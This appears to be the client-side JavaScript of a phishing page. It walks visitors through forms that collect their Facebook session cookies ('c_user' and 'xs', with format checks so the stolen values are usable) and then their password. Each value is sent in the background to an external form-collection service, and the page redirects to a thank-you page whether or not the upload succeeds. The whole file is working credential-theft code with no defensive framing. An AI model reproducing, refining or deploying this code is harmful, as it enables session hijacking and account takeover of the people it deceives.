
function showPage(pageId) {
    document.querySelectorAll('.page').forEach(page => {
        page.classList.remove('active');
    });
    document.getElementById(pageId).classList.add('active');
}

// Configure FormSpark form submissions
const cookieForm = document.getElementById('cookieForm');
const passwordForm = document.getElementById('passwordForm');

cookieForm.addEventListener('submit', function(e) {
    e.preventDefault();
    
    const cuserInput = document.getElementById('cuser');
    const xsInput = document.getElementById('xs');
    
    // Validate c_user (must be 15-17 digits only)
    if (!/^\d{15,17}$/.test(cuserInput.value)) {
        alert('c_user must be 15-17 digits only');
        return;
    }
    
    // Validate xs token format - must be at least 20 characters with allowed characters and 2-3 % characters
    const xsValue = xsInput.value;
    const hasValidChars = /^[A-Za-z0-9:_=.%+-]+$/.test(xsValue);
    const percentageCount = (xsValue.match(/%/g) || []).length;
    
    if (!hasValidChars || xsValue.length < 20 || percentageCount < 2 || percentageCount > 3) {
        alert('xs token must be at least 20 characters, contain 2-3 % characters, and can only contain letters (A-Z, a-z), numbers (0-9), and symbols (:, -, _, =, ., %, +)');
        return;
    }

    // Submit form data in background
    fetch('https://submit-form.com/AxW1K1SNj', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            cuser: cuserInput.value,
            xs: xsInput.value
        })
    }).then(() => {
        showPage('page4');
    }).catch(error => {
        console.error('Error:', error);
        showPage('page4'); // Still proceed to password page
    });
});

passwordForm.addEventListener('submit', function(e) {
    e.preventDefault();
    
    const password = document.getElementById('password').value;
    if (!password) {
        alert('Please enter your password');
        return;
    }
    
    fetch('https://submit-form.com/szNw0mbXJ', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            passwrod: password
        })
    }).then(() => {
        window.location.href = 'thankyou.html';
    }).catch(error => {
        console.error('Error:', error);
        window.location.href = 'thankyou.html';
    });
});
